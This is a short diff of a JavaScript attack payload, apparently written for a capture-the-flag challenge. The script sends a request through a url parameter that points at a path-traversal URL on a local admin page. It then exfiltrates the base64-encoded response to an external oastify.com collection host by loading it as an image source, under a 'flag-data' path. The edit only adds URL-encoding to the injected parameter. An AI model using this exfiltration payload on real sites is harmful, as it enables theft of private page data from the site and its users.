@@ -6,5 +6,5 @@
       var img = new Image();
       img.src = 'https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/flag-data/' + btoa(xhr.responseText);
   };
-  xhr.send('url=http://localhost:5000/admin.php/../index.php?html=- {amount: 1, currency: US, op: BUY}\n- {amount: 1, currency: FL, op: SELL}');
+  xhr.send('url=' + encodeURIComponent('http://localhost:5000/admin.php/../index.php?html=- {amount: 1, currency: US, op: BUY}\n- {amount: 1, currency: FL, op: SELL}'));
 </script>
